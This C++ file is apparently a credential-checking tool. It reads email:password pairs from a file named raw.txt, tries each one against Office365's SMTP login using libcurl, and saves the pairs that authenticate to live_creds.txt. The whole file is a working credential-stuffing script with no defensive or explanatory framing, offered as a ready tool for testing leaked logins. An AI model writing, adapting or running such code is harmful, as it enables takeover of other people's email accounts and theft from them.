#include <iostream>
#include <fstream>
#include <string>
#include <curl/curl.h>

void chk_creds(const std::string &email, const std::string &password, const std::string &receiver_email) {
    CURL *curl;
    CURLcode res = CURLE_OK;
    
    curl = curl_easy_init();
    if(curl) {
        struct curl_slist *recipients = nullptr;
        std::string smtp_url = "smtp://smtp.office365.com:587";
        
        curl_easy_setopt(curl, CURLOPT_URL, smtp_url.c_str());
        curl_easy_setopt(curl, CURLOPT_USERNAME, email.c_str());
        curl_easy_setopt(curl, CURLOPT_PASSWORD, password.c_str());
        curl_easy_setopt(curl, CURLOPT_MAIL_FROM, email.c_str());
        
        recipients = curl_slist_append(recipients, receiver_email.c_str());
        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
        
        res = curl_easy_perform(curl);
        
        if(res != CURLE_OK) {
            std::cout << "\tFailed: " << email.substr(0, email.find('@')) << std::endl;
        } else {
            std::ofstream live_file("live_creds.txt", std::ios_base::app);
            live_file << email << ":" << password << std::endl;
            std::cout << "\tSuccess: " << email << std::endl;
        }
        
        curl_slist_free_all(recipients);
        curl_easy_cleanup(curl);
    }
}

int main() {
    std::string receiver_email = "example@gmail.com";
    std::ifstream file("raw.txt");
    std::string line;

    while(std::getline(file, line)) {
        size_t sep = line.find(':');
        std::string email = line.substr(0, sep);
        std::string password = line.substr(sep + 1);
        chk_creds(email, password, receiver_email);
    }

    return 0;
}
